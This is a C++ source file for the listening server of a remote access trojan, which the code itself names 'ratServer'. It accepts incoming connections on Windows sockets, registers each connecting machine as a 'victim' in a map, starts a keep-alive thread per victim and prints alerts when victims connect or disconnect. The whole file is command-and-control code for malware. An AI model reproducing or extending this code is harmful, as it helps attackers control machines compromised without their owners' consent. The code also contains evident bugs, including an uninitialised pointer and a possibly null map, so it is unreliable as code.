#include "stdafx.h"
#include "server.h"

#define MAXLEN 20000
char sendBuf[20000], recvBuf[20000], *pszAddr = NULL;

server::server(){
	xyz->connected = new bool(false);
	xyz->data = "None";
}

server::~server(){
}

bool server::runManagerServer(unsigned int local_server_port) {
	// retrieves LAPTOP#####, must be 256 bytes or less
	char* hostName = (char*)calloc(256, sizeof(char));
	gethostname(hostName, 256);
	// retrieves host information corresponding to a host name
	struct hostent* phostinfo = gethostbyname(hostName);

	// retrieves NULL-terminated list of addresses for the host into ip
	char* ip_info_buffer = (char*)calloc(256, sizeof(char));
	for (int i = 0; phostinfo != NULL && phostinfo->h_addr_list[i] != NULL; i++) {
		pszAddr = inet_ntoa(*(struct in_addr *)phostinfo->h_addr_list[i]);
	}
	free(hostName);
	// creates a socket, choose IPv4 TCP with no specified protocol
	SOCKADDR_IN addrServer;

	serverManager = socket(AF_INET, SOCK_STREAM, 0);

	// converts a string containing an IPv4 dotted-decimal into unsigned long
	addrServer.sin_addr.S_un.S_addr = inet_addr(pszAddr);
	// IPv4
	addrServer.sin_family = AF_INET;
	addrServer.sin_port = htons(local_server_port);

	// associates a local address with a socket
	if (bind(serverManager, (SOCKADDR *)&addrServer, sizeof(SOCKADDR)) == SOCKET_ERROR) {
		printf("Error while binding ratServer with local address IPv4 %s at port %d, error:%d\n", pszAddr, local_server_port, WSAGetLastError());
		closesocket(serverManager);
		return 0;
	}

	// listening for an incoming connection, maximum length of the queue of pending connections is 1
	listen(serverManager, 1);
	printf("serverManager listening at IPv4 address %s at port %d...\n", pszAddr, local_server_port);

	DWORD ThreadID;
	CreateThread(NULL, 0, runAcceptServer, (void*)this, 0, &ThreadID);
}

std::unordered_map<std::string, victimData*>* server::getVictimsMap() {
	return this->victimsMap;
}

DWORD WINAPI server::runAcceptServer(void* param) {
	server* This = (server*)param;
	return This->acceptConnection();
}

DWORD server::acceptConnection() {
	while (true) {
		while (true) {
			Sleep(1000);
			SOCKADDR_IN addrClient;
			int sockLen = sizeof(SOCKADDR);
			clientManager = accept(serverManager, (SOCKADDR *)&addrClient, &sockLen);
			if (clientManager != SOCKET_ERROR) {
				std::string victim_ip(inet_ntoa(addrClient.sin_addr), 1024);
				victim_ip += '\0';
				victimData* new_victim = (victimData*)calloc(1, sizeof(victimData));
				//new_victim->connected = (bool*)calloc(1, sizeof(bool));
				new_victim->connected = new bool(true);
				std::unordered_map<std::string, victimData*>::const_iterator got;
				if (victimsMap) {
					std::unordered_map<std::string, victimData*>::const_iterator got = (*victimsMap).find(victim_ip);
					if (got == (*victimsMap).end()) {
						new_victim->data = (char*)calloc(20004, sizeof(char));
						std::pair<std::string, victimData*> za(victim_ip, new_victim);
						//printf("std::pair: %d\n", za.second->connected);
						victimsMap->insert(za);
					}
					else {
						if (!(got->second->connected))
							got->second->connected = new_victim->connected;
						else
							continue;
					}
				}
				else {
					new_victim->connected = new_victim->connected;
					new_victim->data = (char*)calloc(20004, sizeof(char));
					std::pair<std::string, victimData*> za(victim_ip, new_victim);
					victimsMap->insert(za);
				}



				//if (((SOCKADDR*)&addrClient)->sa_data

				DWORD ThreadID;
				victimAck* v = (victimAck*)calloc(1, sizeof(victimAck*));
				v->connected = new_victim->connected;
				//printf("thread: %d\n", v->connected);

				v->socket_victim = &clientManager;
				v->buf = new_victim->data;
				CreateThread(NULL, 0, getAliveAck, (void*)v, 0, &ThreadID);
			}
		}
		return 1;
	}
}

DWORD WINAPI server::getAliveAck(void* param) {
	victimAck* v = (victimAck*)param;
	SOCKET* socket_victim = v->socket_victim;
	char* buf = v->buf;
	DWORD timeout = 600000;
	setsockopt(*socket_victim, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(DWORD));
	const int buflen = 20004;
	char tempc[buflen];
	memset(buf, 0, 20004);
	memset(tempc, 0, 20004);
	int recvLen = recv(*socket_victim, tempc, 20004, 0);
	memcpy(buf, (char*)(tempc + 4), buflen - 4);
	std::cout << "**" << "ALERT: Victim connected!" << "**" << std::endl;
	std::cout << "**" << buf << "**" << std::endl;
	std::cout << ">>> ";
	if (recvLen == SOCKET_ERROR) {
		*v->connected = false;
		return 0;
	}
	while (1) {
		//printf("YES!\n");
		memset(tempc, 0, 20004);
		// FLAG 
		int recvLen = recv(*socket_victim, tempc, 20004, 0);
		//printf("%s\n", tempc);
		if (recvLen == SOCKET_ERROR) {
			*v->connected = false;
			break;
		}
	}
	*v->connected = false;
	std::cout << "**" << "ALERT: Victim disconnected!" << "**" << std::endl;
	std::cout << "**" << buf << "**" << std::endl;
	std::cout << ">>> ";
	return 0;
}